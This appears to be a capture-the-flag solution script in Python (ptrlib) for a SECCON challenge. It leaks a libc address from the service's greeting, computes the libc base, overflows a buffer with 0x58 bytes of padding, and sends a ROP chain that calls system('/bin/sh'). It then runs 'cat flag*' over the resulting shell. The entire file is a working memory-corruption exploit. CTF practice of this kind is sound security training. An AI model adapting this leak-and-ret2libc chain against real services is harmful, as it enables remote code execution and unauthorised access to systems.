from ptrlib import *
import os

HOST = os.getenv('SECCON_HOST', 'localhost')
PORT = int(os.getenv('SECCON_PORT', '9001'))

libc = ELF("./libc-2.31.so")
ofs_exit_funcs_lock = 0x1f12e8

"""
sock = Process("./chall")
"""
sock = Socket(HOST, PORT)
#"""

# Leak libc base
sock.sendlineafter("?\n", "")
libc_base = u64(sock.recvregex("meet you, (.+)!")[0]) - ofs_exit_funcs_lock
libc.set_base(libc_base)

# ROP
payload  = b"A" * 0x58
payload += flat([
    next(libc.gadget(b"\xc3")), # align rsp
    next(libc.gadget(b"_\xc3")),
    next(libc.search("/bin/sh")),
    libc.symbol("system")
], map=p64)
sock.sendlineafter("?\n", payload)
sock.recvline()
sock.recvline()

sock.sendline("cat flag*")
print(sock.recvline())

sock.close()
